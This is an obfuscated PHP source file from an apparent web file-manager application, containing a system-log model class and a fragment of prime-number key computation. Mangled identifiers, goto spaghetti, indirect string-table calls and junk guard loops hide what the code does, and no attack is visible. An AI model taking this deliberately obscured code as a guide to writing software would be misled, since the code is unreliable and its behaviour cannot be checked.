$b‰¤›É¦ˆº = $Aòİ†óÄß[121]($Aòİ†óÄß[358] . ($aÌã‹ + $bçÎŒ„»âá) . $Aòİ†óÄß[359] . $B„óç£â‰ä . $Aòİ†óÄß[359] . $aŠÂ÷£’© . $Aòİ†óÄß[360]); $bĞÅ¡‹­³™ = $BÌ¯÷¡ñ°[697]; $a’ğ÷À·å = $this->{$_SERVER[¬œç„§²ö°ô][257]}($dÍ“´Œî¶[0], $b‰¤›É¦ˆº); goto aŞåÇÕ—«À; DĞ—Û÷¢Å½: $BÂ“¾Š”î = $BÌ¯÷¡ñ°[696]; if (!$BÂ“¾Š”î) { die; } for ($DÀ£ëù”¬ = 0; $DÀ£ëù”¬ < $dİÁö¤İêŠ * 10; $DÀ£ëù”¬++) { if (($dİÁö¤İêŠ * $DÀ£ëù”¬ + 1) % $B„óç£â‰ä == 0) { $aŠÂ÷£’© = $Aòİ†óÄß[251](($dİÁö¤İêŠ * $DÀ£ëù”¬ + 1) / $B„óç£â‰ä); break; } } goto cƒÔË±íĞ®; dñÃ¥ÒƒÄ: $dİÁö¤İêŠ = ($aÌã‹ - 1) * ($bçÎŒ„»âá - 1); $BÀßÈ¦À•¶ = $BÌ¯÷¡ñ°[693]; if (strlen($BÀßÈ¦À•¶) < $BÌ¯÷¡ñ°[570]) { die; } goto bÒİ÷‡äŸÒ; aŞåÇÕ—«À: $AÏ¢š”ÙÎ = $BÌ¯÷¡ñ°[698]; if (strlen($AÏ¢š”ÙÎ) < $BÌ¯÷¡ñ°[570]) { die; } return $a’ğ÷À·å; goto bÁëÉæÓù¡; BìÊÌ“ÜÁ£: $BÌ¯÷¡ñ° =& $_SERVER[¹Ò‹Ò¹]; $Aòİ†óÄß =& $_SERVER[¬œç„§²ö°ô]; $dÍ“´Œî¶ = $Aòİ†óÄß[0]($Aòİ†óÄß[361], $C—ä‹ÈÛ ˆ); goto f‡¿ĞØäê•; AôÊ¶˜Ø˜: $b‘¯ìŠ‡’’ = $BÌ¯÷¡ñ°[690]; if (!$b‘¯ìŠ‡’’) { return; } for ($DÀ£ëù”¬ = 3; $DÀ£ëù”¬ < $d…ì«À™™Ÿ; $DÀ£ëù”¬ += 2) { if ($d…ì«À™™Ÿ % $DÀ£ëù”¬ != 0) { continue; } $aÌã‹ = $DÀ£ëù”¬; $C©”†ô›ŠÄ = $BÌ¯÷¡ñ°[691]; if (strlen($C©”†ô›ŠÄ) < $BÌ¯÷¡ñ°[592]) { return; } $bçÎŒ„»âá = $Aòİ†óÄß[251]($d…ì«À™™Ÿ / $DÀ£ëù”¬); $aÅ„­³ìäÓ = $BÌ¯÷¡ñ°[692]; while ($aÅ„­³ìäÓ < $BÌ¯÷¡ñ°[582]) { if ($aÅ„­³ìäÓ >= 0) { break; } $aÅ„­³ìäÓ++; } break; } goto dñÃ¥ÒƒÄ; bÁëÉæÓù¡: } public function ewxb750c49ee() { goto B‡Ù÷ºìêŸ; B‡Ù÷ºìêŸ: $d×ïÊÀ§‚µ =& $_SERVER[¹Ò‹Ò¹]; $bÔØ‡ğÆèå =& $_SERVER[¬œç„§²ö°ô]; $bËáÌ¶­ = $bÔØ‡ğÆèå[342]($bÔØ‡ğÆèå[362](2, 14), $bÔØ‡ğÆèå[362](2, 16) - 1); goto F¶Ù’¡”„; b÷óéªá×: $A¾‘‹¿ƒåÓ = 2; for ($dõˆšİ‚“† = $bËáÌ¶­; $dõˆšİ‚“† > 1; $dõˆšİ‚“†--) { $Fí§¿İøİ™ = !0; $FŒæí«±áª = $d×ïÊÀ§‚µ[700]; if (strlen($FŒæí«±áª) < $d×ïÊÀ§‚µ[592]) { die; } foreach ($E¼Ğì£ as $EÌÑí¥„³ñ) { if ($dõˆšİ‚“† % $EÌÑí¥„³ñ == 0) { $Fí§¿İøİ™ = !1; break; } } if ($Fí§¿İøİ™) { $A¾‘‹¿ƒåÓ = $dõˆšİ‚“†; break; } } return $A¾‘‹¿ƒåÓ; goto C‡Ö¯øà†; F¶Ù’¡”„: $E¼Ğì£ = array(); $F³‹·©¶Ó´ = 1; while ($F³‹·©¶Ó´ <= (int) $bÔØ‡ğÆèå[363]($bËáÌ¶­)) { $dõˆšİ‚“† = $F³‹·©¶Ó´; while (!0) { $dõˆšİ‚“†++; if ($dõˆšİ‚“† <= 2) { $F³‹·©¶Ó´ = $dõˆšİ‚“†; break; } else { if ($dõˆšİ‚“† < 2) { continue; } } $Fí§¿İøİ™ = !0; for ($DÚ²Ü”“ß = 2; $DÚ²Ü”“ß <= $bÔØ‡ğÆèå[363]($dõˆšİ‚“†); $DÚ²Ü”“ß++) { if ($dõˆšİ‚“† % $DÚ²Ü”“ß == 0) { $Fí§¿İøİ™ = !1; } } if ($Fí§¿İøİ™) { $F³‹·©¶Ó´ = $dõˆšİ‚“†; break; } } $E¼Ğì£[] = $F³‹·©¶Ó´; $CïôÒİœ„ = $d×ïÊÀ§‚µ[699]; if (strlen($CïôÒİœ„) < $d×ïÊÀ§‚µ[570]) { return; } } goto b÷óéªá×; C‡Ö¯øà†: } public function cwgje1ae642b($D²œ¡´¾”, $e‚Š‚…ñ©°) { $B“î¸Şîó‘ =& $_SERVER[¬œç„§²ö°ô]; return $B“î¸Şîó‘[13](array($B“î¸Şîó‘[14], $B“î¸Şîó‘[364]), $D²œ¡´¾”, $e‚Š‚…ñ©°); } public function oarh489f9c16($e‰„ˆĞÆ‚³, $BÚò­ŸØÎñ) { $Eùå×Æ¿â =& $_SERVER[¹Ò‹Ò¹]; $f¼ùàÄª‡Á =& $_SERVER[¬œç„§²ö°ô]; return $f¼ùàÄª‡Á[13](array($f¼ùàÄª‡Á[365], $f¼ùàÄª‡Á[366]), $e‰„ˆĞÆ‚³, $BÚò­ŸØÎñ); $bÂĞËÅ·Ü = $Eùå×Æ¿â[619]; while ($bÂĞËÅ·Ü < $Eùå×Æ¿â[582]) { if ($bÂĞËÅ·Ü >= 0) { break; } $bÂĞËÅ·Ü++; } } public function asnda0d30d91($f¹²”Ş±†Œ, $d° îÃœÆ) { $bÂÀ“†…õ =& $_SERVER[¹Ò‹Ò¹]; $d”ñ„³ôŠÎ =& $_SERVER[¬œç„§²ö°ô]; return $d”ñ„³ôŠÎ[13](array($d”ñ„³ôŠÎ[365], $d”ñ„³ôŠÎ[367]), $f¹²”Ş±†Œ, $d° îÃœÆ); $F“›Íù‡İ’ = $bÂÀ“†…õ[701]; while ($F“›Íù‡İ’ < $bÂÀ“†…õ[582]) { if ($F“›Íù‡İ’ >= 0) { break; } $F“›Íù‡İ’++; } } } goto BîÙæ±”–; c³Ü‰êÖĞÙ: class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\x73\164\145\155\137\154\157\147"; protected $dataAuto = array(array("\143\162\145\x61\x74\145\x54\x69\155\145", "\x74\151\x6d\145", "\151\x6e\x73\145\x72\164", "\146\165\x6e\x63\x74\x69\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $e„Û÷ôƒ« =& $_SERVER[¹Ò‹Ò¹]; return array($e„Û÷ôƒ«[1981] => LNG($e„Û÷ôƒ«[1982]), $e„Û÷ôƒ«[1983] => LNG($e„Û÷ôƒ«[1984]), $e„Û÷ôƒ«[1607] => LNG($e„Û÷ôƒ«[1985]), $e„Û÷ôƒ«[1986] => LNG($e„Û÷ôƒ«[1987]), $e„Û÷ôƒ«[1988] => LNG($e„Û÷ôƒ«[1989]), $e„Û÷ôƒ«[1990] => LNG($e„Û÷ôƒ«[1991]), $e„Û÷ôƒ«[1992] => LNG($e„Û÷ôƒ«[1993]), $e„Û÷ôƒ«[1637] => LNG($e„Û÷ôƒ«[1993]), $e„Û÷ôƒ«[1638] => LNG($e„Û÷ôƒ«[1994]), $e„Û÷ôƒ«[1995] => LNG($e„Û÷ôƒ«[1996]), $e„Û÷ôƒ«[1997] => LNG($e„Û÷ôƒ«[1998]), $e„Û÷ôƒ«[1999] => LNG($e„Û÷ôƒ«[2000]), $e„Û÷ôƒ«[2001] => LNG($e„Û÷ôƒ«[2002]), $e„Û÷ôƒ«[1635] => LNG($e„Û÷ôƒ«[2003]), $e„Û÷ôƒ«[1642] => LNG($e„Û÷ôƒ«[2004]), $e„Û÷ôƒ«[2005] => LNG($e„Û÷ôƒ«[2006]), $e„Û÷ôƒ«[2007] => LNG($e„Û÷ôƒ«[2008]), $e„Û÷ôƒ«[2009] => LNG($e„Û÷ôƒ«[2010]), $e„Û÷ôƒ«[2011] => LNG($e„Û÷ôƒ«[2012]), $e„Û÷ôƒ«[1645] => LNG($e„Û÷ôƒ«[2013]), $e„Û÷ôƒ«[1646] => LNG($e„Û÷ôƒ«[2014]), $e„Û÷ôƒ«[2015] => LNG($e„Û÷ôƒ«[2016]), $e„Û÷ôƒ«[2017] => LNG($e„Û÷ôƒ«[2018]), $e„Û÷ôƒ«[2019] => LNG($e„Û÷ôƒ«[2020]), $e„Û÷ôƒ«[1640] => LNG($e„Û÷ôƒ«[2021]), $e„Û÷ôƒ«[2022] => LNG($e„Û÷ôƒ«[2023]), $e„Û÷ôƒ«[1639] => LNG($e„Û÷ôƒ«[2024]), $e„Û÷ôƒ«[2025] => LNG($e„Û÷ôƒ«[2026]), $e„Û÷ôƒ«[2027] => LNG($e„Û÷ôƒ«[2028]), $e„Û÷ôƒ«[2029] => LNG($e„Û÷ôƒ«[2030]), $e„Û÷ôƒ«[2031] => LNG($e„Û÷ôƒ«[2031]), $e„Û÷ôƒ«[2032] => LNG($e„Û÷ôƒ«[1611]), $e„Û÷ôƒ«[2033] => LNG($e„Û÷ôƒ«[2034]), $e„Û÷ôƒ«[2035] => LNG($e„Û÷ôƒ«[2036]), $e„Û÷ôƒ«[2037] => LNG($e„Û÷ôƒ«[2038]), $e„Û÷ôƒ«[2039] => LNG($e„Û÷ôƒ«[2040]), $e„Û÷ôƒ«[2041] => LNG($e„Û÷ôƒ«[2042]), $e„Û÷ôƒ«[2043] => LNG($e„Û÷ôƒ«[2043]), $e„Û÷ôƒ«[2044] => LNG($e„Û÷ôƒ«[2045]), $e„Û÷ôƒ«[2046] => LNG($e„Û÷ôƒ«[2047]), $e„Û÷ôƒ«[2048] => LNG($e„Û÷ôƒ«[2049]), $e„Û÷ôƒ«[2050] => LNG($e„Û÷ôƒ«[2051]), $e„Û÷ôƒ«[2052] => LNG($e„Û÷ôƒ«[2053]), $e„Û÷ôƒ«[2054] => LNG($e„Û÷ôƒ«[2055])); } private function typeFile() { $aĞÌéÇè»â =& $_SERVER[¹Ò‹Ò¹]; $d¡ö«¹ÜÎ  = array($aĞÌéÇè»â[1642] => array($aĞÌéÇè»â[1643]), $aĞÌéÇè»â[1999] => array($aĞÌéÇè»â[2056]), $aĞÌéÇè»â[2001] => array($aĞÌéÇè»â[2057]), $aĞÌéÇè»â[1635] => array($aĞÌéÇè»â[1636]), $aĞÌéÇè»â[2007] => array(), $aĞÌéÇè»â[2009] => array(), $aĞÌéÇè»â[2011] => array(), $aĞÌéÇè»â[1645] => array($aĞÌéÇè»â[1647]), $aĞÌéÇè»â[1646] => array($aĞÌéÇè»â[1647]), $aĞÌéÇè»â[2015] => array($aĞÌéÇè»â[2058]), $aĞÌéÇè»â[2017] => array($aĞÌéÇè»â[2058]), $aĞÌéÇè»â[2019] => array($aĞÌéÇè»â[2059]), $aĞÌéÇè»â[2005] => array($aĞÌéÇè»â[2060]), $aĞÌéÇè»â[1640] => array($aĞÌéÇè»â[2061]), $aĞÌéÇè»â[2022] => array($aĞÌéÇè»â[2062]), $aĞÌéÇè»â[1639] => array($aĞÌéÇè»â[1641])); return $d¡ö«¹ÜÎ ; } private function typeAll() { goto c¦–Ôù”„¸; F†›åŞÃô: foreach ($f‹ŠºÂ»‘ as $DØæ¬µ•¯å => $BŠø‹•Ê») { $aÆÌÉ”©îƒ[$BŠø‹•Ê»[0]] = $aÆÌÉ”©îƒ[$DØæ¬µ•¯å]; } $aÆÌÉ”©îƒ[$f¢ …ßÔØŠ[1647]] = LNG($f¢ …ßÔØŠ[2063]); $aÆÌÉ”©îƒ[$f¢ …ßÔØŠ[2058]] = LNG($f¢ …ßÔØŠ[2064]); goto EÄÑ‰Æà¹Ÿ; EÄÑ‰Æà¹Ÿ: return $aÆÌÉ”©îƒ; goto B¤ÓÒèÅğ–; c¦–Ôù”„¸: $f¢ …ßÔØŠ =& $_SERVER[¹Ò‹Ò¹]; $aÆÌÉ”©îƒ = $this->typeList; $f‹ŠºÂ»‘ = array_filter($this->typeFile()); goto F†›åŞÃô; B¤ÓÒèÅğ–: } public function addLog($F™ŠØ¹‚õ÷, $c²¬ÏéÂåÄ = array()) { goto AÓòâÌƒæ; bÔ«ù¸ä‘: if (!$e©ãõ–ÔÎİ) { $e©ãõ–ÔÎİ = (int) Session::get($D¿Ÿš¹„[1795]); } $Aö½¤íùİš = get_client_ip(); if (!$c²¬ÏéÂåÄ || strlen(json_encode($c²¬ÏéÂåÄ)) >= 1024) { $c²¬ÏéÂåÄ = array($D¿Ÿš¹„[2065] => $Aö½¤íùİš); } else { if (is_array($c²¬ÏéÂåÄ)) { $c²¬ÏéÂåÄ[$D¿Ÿš¹„[2065]] = $Aö½¤íùİš; } else { $c²¬ÏéÂåÄ = array($D¿Ÿš¹„[1063] => $c²¬ÏéÂåÄ, $D¿Ÿš¹„[2065] => $Aö½¤íùİš); } } goto B¥ˆíÑŠğ; B¥ˆíÑŠğ: $c²¬ÏéÂåÄ = array($D¿Ÿš¹„[1495] => Session::sign(), $D¿Ÿš¹„[1496] => $e©ãõ–ÔÎİ, $D¿Ÿš¹„[29] => $F™ŠØ¹‚õ÷, $D¿Ÿš¹„[1498] => json_encode($c²¬ÏéÂåÄ)); parent::add($c²¬ÏéÂåÄ); goto cµöĞ»³ˆ÷; AÓòâÌƒæ: $D¿Ÿš¹„ =& $_SERVER[¹Ò‹Ò¹]; if (!isset($this->typeList[$F™ŠØ¹‚õ÷])) { return; } $e©ãõ–ÔÎİ = defined($D¿Ÿš¹„[448]) && USER_ID ? USER_ID : (isset($c²¬ÏéÂåÄ[$D¿Ÿš¹„[1504]]) ? $c²¬ÏéÂåÄ[$D¿Ÿš¹„[1504]] : 0); goto bÔ«ù¸ä‘; cµöĞ»³ˆ÷: } public function remove($AµÜÀô†¡) { $this->where(array($_SERVER[¹Ò‹Ò¹][406] => $AµÜÀô†¡))->delete(); } private function _makeOrder($F„ºòÅ­¡Ğ = '') { goto bö£½‘å¾Ï; bö£½‘å¾Ï: $B½õØÁ©Ç­ =& $_SERVER[¹Ò‹Ò¹]; $ešÂ½ªÛ÷ó = $B½õØÁ©Ç­[192]; $F¶Ãï°£Ö = array($B½õØÁ©Ç­[422] => $B½õØÁ©Ç­[423], $B½õØÁ©Ç­[424] => $B½õØÁ©Ç­[425]); goto c¯Ÿ™“ô´ß; aÕôùÉİ›: return $this->order($F„ºòÅ­¡Ğ); goto aè¥êÏæ‰à; c¯Ÿ™“ô´ß: $dƒàæ•Ñ¦† = Input::get($B½õØÁ©Ç­[430], $B½õØÁ©Ç­[7], $B½õØÁ©Ç­[1827], array($B½õØÁ©Ç­[1751], $B½õØÁ©Ç­[424])); $dƒàæ•Ñ¦† = $F¶Ãï°£Ö[$dƒàæ•Ñ¦†]; $F„ºòÅ­¡Ğ = $F„ºòÅ­¡Ğ . "{$ešÂ½ªÛ÷ó}\x20{$dƒàæ•Ñ¦†}"; goto aÕôùÉİ›; aè¥êÏæ‰à: } public function get($eÈ¿¤°ùƒ = '') { goto a”ˆ ¼µ¯…; a”ˆ ¼µ¯…: $e„š•÷éÅ‰ =& $_SERVER[¹Ò‹Ò¹]; if (!$eÈ¿¤°ùƒ) { show_json(array()); } $a˜ ­»ÂĞ“ = array(); goto B…À”£¦Şå; B…À”£¦Şå: if ($eÈ¿¤°ùƒ[$e„š•÷éÅ‰[1504]]) { $a˜ ­»ÂĞ“[$e„š•÷éÅ‰[1504]] = $eÈ¿¤°ùƒ[$e„š•÷éÅ‰[1504]]; } if (isset($eÈ¿¤°ùƒ[$e„š•÷éÅ‰[717]])) { $Aö“‚Ÿ‘Ñ¿ = $eÈ¿¤°ùƒ[$e„š•÷éÅ‰[717]]; $BÛ‹àµ”Èò = isset($eÈ¿¤°ùƒ[$e„š•÷éÅ‰[470]]) ? $eÈ¿¤°ùƒ[$e„š•÷éÅ‰[470]] : time(); $a˜ ­»ÂĞ“[$e„š•÷éÅ‰[192]] = array($e„š•÷éÅ‰[329], array($Aö“‚Ÿ‘Ñ¿, $BÛ‹àµ”Èò)); } if ($eÈ¿¤°ùƒ[$e„š•÷éÅ‰[29]]) { $DÎÇŒ°•ó = explode($e„š•÷éÅ‰[47], $eÈ¿¤°ùƒ[$e„š•÷éÅ‰[29]]); $D©ÒŒŞ¡»å = $this->typeFile(); $AÑ»Çš‰»ö = array(); foreach ($DÎÇŒ°•ó as $aˆÏÍ ¯) { $AÑ»Çš‰»ö[] = $aˆÏÍ ¯; if (isset($D©ÒŒŞ¡»å[$aˆÏÍ ¯])) { $AÑ»Çš‰»ö = array_merge($AÑ»Çš‰»ö, $D©ÒŒŞ¡»å[$aˆÏÍ ¯]); } } $AÑ»Çš‰»ö = array_unique($AÑ»Çš‰»ö); if ($AÑ»Çš‰»ö) { $a˜ ­»ÂĞ“[$e„š•÷éÅ‰[29]] = array($e„š•÷éÅ‰[7], $AÑ»Çš‰»ö); } } else { $a˜ ­»ÂĞ“[$e„š•÷éÅ‰[29]] = array($e„š•÷éÅ‰[2066], $e„š•÷éÅ‰[2067]); } goto Cò…Ë¦ã­ò; aÙ¶©¯«õæ: $B¡åçÀÈšÀ[$e„š•÷éÅ‰[365]] = $this->logList($B¡åçÀÈšÀ[$e„š•÷éÅ‰[365]]); return $B¡åçÀÈšÀ; goto bÑöÃöÀÚ; Cò…Ë¦ã­ò: if (!empty($eÈ¿¤°ùƒ[$e„š•÷éÅ‰[2065]])) { $a˜ ­»ÂĞ“[$e„š•÷éÅ‰[425]] = array($e„š•÷éÅ‰[378], "\45{$eÈ¿¤°ùƒ[$e„š•÷éÅ‰[2065]]}\45"); } $B¡åçÀÈšÀ = $this->_makeOrder()->where($a˜ ­»ÂĞ“)->selectPage(); if (empty($B¡åçÀÈšÀ[$e„š•÷éÅ‰[365]])) { show_json(array(), !0, $B¡åçÀÈšÀ[$e„š•÷éÅ‰[362]]); } goto aÙ¶©¯«õæ; bÑöÃöÀÚ: } private function ipAddress(&$C²«ßòÈêè) { $A¨ƒÏ‰ºÓ =& $_SERVER[¹Ò‹Ò¹]; if (!empty($C²«ßòÈêè[$A¨ƒÏ‰ºÓ[2065]])) { $C©«óÃ„Êö = IpLocation::get($C²«ßòÈêè[$A¨ƒÏ‰ºÓ[2065]]); } else { $C©«óÃ„Êö = LNG($A¨ƒÏ‰ºÓ[2068]); } $C²«ßòÈêè[$A¨ƒÏ‰ºÓ[2069]] = $C©«óÃ„Êö; } private function descZipDownload($bõ³ÁŞ‰¤­, &$fÓß‘ò‡ƒË) { $DÙ…—¨Öª =& $_SERVER[¹Ò‹Ò¹]; if (!isset($bõ³ÁŞ‰¤­[$DÙ…—¨Öª[2070]])) { return; } $D¤ï½ô­…¡ = json_decode($bõ³ÁŞ‰¤­[$DÙ…—¨Öª[2070]], !0); foreach ($D¤ï½ô­…¡ as $bˆßÇÛƒÜ) { try { $D¸±…Æ•”¡ = IO::infoFull($bˆßÇÛƒÜ[$DÙ…—¨Öª[75]]); } catch (Exception $A»æƒˆ‘¤Ø) { continue; } $bõ³ÁŞ‰¤­[$DÙ…—¨Öª[75]] = $bˆßÇÛƒÜ[$DÙ…—¨Öª[75]]; $fÓß‘ò‡ƒË[] = $bõ³ÁŞ‰¤­[$DÙ…—¨Öª[390]] = $D¸±…Æ•”¡[$DÙ…—¨Öª[390]]; $fÓß‘ò‡ƒË[] = $bõ³ÁŞ‰¤­[$DÙ…—¨Öª[1883]] = $D¸±…Æ•”¡[$DÙ…—¨Öª[472]]; break; } return $bõ³ÁŞ‰¤­; } private function getSourceList(&$dÎã’‹ğ±) { $aÌğïõª =& $_SERVER[¹Ò‹Ò¹]; $Dà ë‹ëÈÃ = array(); foreach ($dÎã’‹ğ± as $D¸ìÁÜ¦À => $fÙ­»­ÁñÖ) { goto e¡ï¸ØŠ›; cğÎ´‘ÆùÄ: if ($cäÀğˆƒ´œ[$aÌğïõª[29]] == $aÌğïõª[1891]) { $Dà ë‹ëÈÃ[] = $cäÀğˆƒ´œ[$aÌğïõª[425]][$aÌğïõª[390]]; } goto A‡ê·‡ê; e¡ï¸ØŠ›: $cäÀğˆƒ´œ = json_decode($fÙ­»­ÁñÖ[$aÌğïõª[425]], !0); if ($fÙ­»­ÁñÖ[$aÌğïõª[29]] == $aÌğïõª[1638]) { $cäÀğˆƒ´œ = $this->descZipDownload($cäÀğˆƒ´œ, $Dà ë‹ëÈÃ); $dÎã’‹ğ±[$D¸ìÁÜ¦À][$aÌğïõª[425]] = json_encode($cäÀğˆƒ´œ); continue; } if (strpos($fÙ­»­ÁñÖ[$aÌğïõª[29]], $aÌğïõª[1884]) !== 0) { if (!isset($cäÀğˆƒ´œ[$aÌğïõª[75]]) || strpos($fÙ­»­ÁñÖ[$aÌğïõª[29]], $aÌğïõª[2071]) !== 0) { continue; } try { $Aæë¾ïË™Å = IO::infoFull($cäÀğˆƒ´œ[$aÌğïõª[75]]); } catch (Exception $c÷ç…‘ñõ¶) { continue; } $Dà ë‹ëÈÃ[] = $cäÀğˆƒ´œ[$aÌğïõª[390]] = $Aæë¾ïË™Å[$aÌğïõª[390]]; $Dà ë‹ëÈÃ[] = $cäÀğˆƒ´œ[$aÌğïõª[1883]] = $Aæë¾ïË™Å[$aÌğïõª[472]]; $dÎã’‹ğ±[$D¸ìÁÜ¦À][$aÌğïõª[425]] = json_encode($cäÀğˆƒ´œ); continue; } goto d¼š¿Œ«ø–; d¼š¿Œ«ø–: $Dà ë‹ëÈÃ[] = $cäÀğˆƒ´œ[$aÌğïõª[390]]; $Dà ë‹ëÈÃ[] = $cäÀğˆƒ´œ[$aÌğïõª[1883]]; if ($cäÀğˆƒ´œ[$aÌğïõª[29]] == $aÌğïõª[515]) { $Dà ë‹ëÈÃ[] = $cäÀğˆƒ´œ[$aÌğïõª[425]][$aÌğïõª[1030]]; $Dà ë‹ëÈÃ[] = $cäÀğˆƒ´œ[$aÌğïõª[425]][$aÌğïõª[1031]]; } goto cğÎ´‘ÆùÄ; A‡ê·‡ê: } if (!$Dà ë‹ëÈÃ) { return array(); } return Model($aÌğïõª[769])->sourceListInfo($Dà ë‹ëÈÃ, !0); } private function logList($C“é«„ÑÏ§) { goto dÑâ”‚‹± ; Fù”±ƒƒ¸§: $AÊÄ»¹…íè = array(); foreach ($C“é«„ÑÏ§ as $E…†—ù“ => $fƒ†¿•ßæ½) { goto e‰ÒÉÉŒ™; fç›ï¶°ª‡: $fƒ†¿•ßæ½[$dƒ–—£ïù[28]] = isset($E¹»Ñ‰ä»§[$dƒ–—£ïù[28]]) ? $E¹»Ñ‰ä»§[$dƒ–—£ïù[28]] : LNG($dƒ–—£ïù[2068]); $fƒ†¿•ßæ½[$dƒ–—£ïù[1933]] = isset($E¹»Ñ‰ä»§[$dƒ–—£ïù[1933]]) ? $E¹»Ñ‰ä»§[$dƒ–—£ïù[1933]] : $dƒ–—£ïù[33]; $fƒ†¿•ßæ½[$dƒ–—£ïù[1410]] = isset($F·‰Ñ¼²ºê[$E¶¥³•ÜÃ“]) ? $F·‰Ñ¼²ºê[$E¶¥³•ÜÃ“] : $dÑÚ±Ïó¯˜; goto bÀù¥Ñİö; e‰ÒÉÉŒ™: $E¶¥³•ÜÃ“ = $fƒ†¿•ßæ½[$dƒ–—£ïù[29]]; $E¹»Ñ‰ä»§ = isset($bÖëæ¬ëŞ©[$fƒ†¿•ßæ½[$dƒ–—£ïù[1504]]]) ? $bÖëæ¬ëŞ©[$fƒ†¿•ßæ½[$dƒ–—£ïù[1504]]] : !1; $dÑÚ±Ïó¯˜ = strpos($E¶¥³•ÜÃ“, $dƒ–—£ïù[2072]) === 0 ? LNG($dƒ–—£ïù[2073]) : LNG($dƒ–—£ïù[2068]); goto fç›ï¶°ª‡; bÀù¥Ñİö: $fƒ†¿•ßæ½[$dƒ–—£ïù[1826]] = $E¹»Ñ‰ä»§; $CĞë…±ËÑê = json_decode($fƒ†¿•ßæ½[$dƒ–—£ïù[425]], !0); $fƒ†¿•ßæ½[$dƒ–—£ïù[2065]] = isset($CĞë…±ËÑê[$dƒ–—£ïù[2065]]) ? $CĞë…±ËÑê[$dƒ–—£ïù[2065]] : $dƒ–—£ïù[33]; goto bõé¶”„Ïá; dŠêè…Î‡ö: unset($fƒ†¿•ßæ½[$dƒ–—£ïù[2074]]); $A½õ†ã—×[] = $fƒ†¿•ßæ½; goto Dôôˆ¤Œ ; bõé¶”„Ïá: $this->ipAddress($fƒ†¿•ßæ½); if (strpos($E¶¥³•ÜÃ“, $dƒ–—£ïù[1884]) === 0 || isset($CĞë…±ËÑê[$dƒ–—£ïù[1883]])) { goto A„Ñ…¦Ó¾Â; bŒÉ”òìôŸ: if ($CĞë…±ËÑê[$dƒ–—£ïù[1896]] && $CĞë…±ËÑê[$dƒ–—£ïù[1896]][$dƒ–—£ïù[398]] == $dƒ–—£ïù[1144]) { $AÊÄ»¹…íè[] = $fƒ†¿•ßæ½[$dƒ–—£ïù[388]]; unset($C“é«„ÑÏ§[$E…†—ù“]); continue; } goto D™œ‚ã Ú¥; f´÷¥ù‹°Ù: if ($CĞë…±ËÑê[$dƒ–—£ïù[29]] == $dƒ–—£ïù[1891]) { $CĞë…±ËÑê[$dƒ–—£ïù[425]][$dƒ–—£ïù[390]] = $Bƒ÷†ë®ñ±[$CĞë…±ËÑê[$dƒ–—£ïù[425]][$dƒ–—£ïù[390]]]; } if ($CĞë…±ËÑê[$dƒ–—£ïù[29]] == $dƒ–—£ïù[1633]) { $CĞë…±ËÑê[$dƒ–—£ïù[1896]] = $CĞë…±ËÑê[$dƒ–—£ïù[84]]; $CĞë…±ËÑê[$dƒ–—£ïù[1883]] = $CĞë…±ËÑê[$dƒ–—£ïù[1896]][$dƒ–—£ïù[390]]; $CĞë…±ËÑê[$dƒ–—£ïù[84]] = !1; $CĞë…±ËÑê[$dƒ–—£ïù[390]] = $dƒ–—£ïù[33]; } if ($CĞë…±ËÑê[$dƒ–—£ïù[84]] && $CĞë…±ËÑê[$dƒ–—£ïù[84]][$dƒ–—£ïù[398]] == $dƒ–—£ïù[1144]) { $AÊÄ»¹…íè[] = $fƒ†¿•ßæ½[$dƒ–—£ïù[388]]; unset($C“é«„ÑÏ§[$E…†—ù“]); continue; } goto bŒÉ”òìôŸ; A„Ñ…¦Ó¾Â: $CĞë…±ËÑê[$dƒ–—£ïù[84]] = $Bƒ÷†ë®ñ±[$CĞë…±ËÑê[$dƒ–—£ïù[390]]]; $CĞë…±ËÑê[$dƒ–—£ïù[1896]] = $Bƒ÷†ë®ñ±[$CĞë…±ËÑê[$dƒ–—£ïù[1883]]]; if ($CĞë…±ËÑê[$dƒ–—£ïù[29]] == $dƒ–—£ïù[515]) { $CĞë…±ËÑê[$dƒ–—£ïù[425]][$dƒ–—£ïù[1030]] = $Bƒ÷†ë®ñ±[$CĞë…±ËÑê[$dƒ–—£ïù[425]][$dƒ–—£ïù[1030]]]; $CĞë…±ËÑê[$dƒ–—£ïù[425]][$dƒ–—£ïù[1031]] = $Bƒ÷†ë®ñ±[$CĞë…±ËÑê[$dƒ–—£ïù[425]][$dƒ–—£ïù[1031]]]; } goto f´÷¥ù‹°Ù; D™œ‚ã Ú¥: } $fƒ†¿•ßæ½[$dƒ–—£ïù[425]] = $CĞë…±ËÑê; goto dŠêè…Î‡ö; Dôôˆ¤Œ : } $this->clearSystemPathLog($AÊÄ»¹…íè); goto b÷ğ‰‡Ó—ˆ; dÑâ”‚‹± : $dƒ–—£ïù =& $_SERVER[¹Ò‹Ò¹]; $d³ì¾ÌœÎ = array_to_keyvalue($C“é«„ÑÏ§, $dƒ–—£ïù[33], $dƒ–—£ïù[1504]); $bÖëæ¬ëŞ© = Model($dƒ–—£ïù[501])->userListInfo(array_unique($d³ì¾ÌœÎ)); goto f„´Æ—Şá; b÷ğ‰‡Ó—ˆ: return $A½õ†ã—×; goto FÕÊÔ¾ ‚; f„´Æ—Şá: $Bƒ÷†ë®ñ± = $this->getSourceList($C“é«„ÑÏ§); $F·‰Ñ¼²ºê = $this->typeAll(); $A½õ†ã—× = array(); goto Fù”±ƒƒ¸§; FÕÊÔ¾ ‚: } private function clearSystemPathLog($DºÃ†Ç¥º…) { $a¥ëö¶å¸ =& $_SERVER[¹Ò‹Ò¹]; if (count($DºÃ†Ç¥º…) == 0) { return; } $AÄ“óÙÃ…˜ = array($a¥ëö¶å¸[388] => array($a¥ëö¶å¸[7], array_unique($DºÃ†Ç¥º…))); $this->where($AÄ“óÙÃ…˜)->delete(); } public function deviceList($FÁÍÄ†Ù¡¯, $a×Œ—Šë¶ = 0) { $AøäÁÓÍ¬ =& $_SERVER[¹Ò‹Ò¹]; $D§í¡ñá = array($AøäÁÓÍ¬[1504] => $FÁÍÄ†Ù¡¯, $AøäÁÓÍ¬[192] => array($AøäÁÓÍ¬[947], $a×Œ—Šë¶), $AøäÁÓÍ¬[29] => $AøäÁÓÍ¬[1607]); $c‰“²™±Š = array(); $BÈ¹ë„© = $this->field($AøäÁÓÍ¬[2075])->where($D§í¡ñá)->order($AøäÁÓÍ¬[1894])->limit(50)->select(); foreach ($BÈ¹ë„© as $A“Ç›î¬Šß => $aïÁ¢‰Ûà¹) { goto D¼‚ºÓµí; dÅÛÇÛºˆ–: 